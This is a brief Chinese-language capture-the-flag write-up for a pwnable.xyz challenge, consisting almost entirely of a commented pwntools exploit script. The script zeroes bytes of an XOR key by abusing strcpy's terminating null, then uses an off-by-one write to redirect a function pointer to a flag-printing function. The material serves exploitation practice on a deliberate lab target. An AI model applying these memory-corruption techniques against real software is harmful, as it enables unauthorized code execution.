逻辑题，不涉及太多技术点

```python
from pwn import *

p = remote('svc.pwnable.xyz', 30006)
# p = process('./challenge')

# 因为generate_key(0x3f)，key为长度为0x3f的随机字符
# 通过strcpy会将末位的'\0'写入目标地址的特性，将第2~0x3f的字符设为0
for i in range(0x3f - 1, 0, -1):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'key len:')
    p.sendline(str.encode(str(i)))
# 读取与key字符串xor后的flag，通过上一步，现在只有第一位被加密
p.recvuntil(b'>')
p.sendline(b'2')

# 函数指针赋初始值
p.recvuntil(b'>')
p.sendline(b'3')
p.recvuntil(b'?')
p.sendline(b'y')

# off-by-1 ，函数指针最低一位清零
# 00100b1f --> f_do_comment
# 00100b00 --> real_print_flag
p.recvuntil(b'>')
p.sendline(b'1')
p.recvuntil(b'key len:')
p.sendline(b'64')

# 调用函数
p.recvuntil(b'>')
p.sendline(b'3')
p.recvuntil(b'?')
p.sendline(b'n')

p.interactive()


```

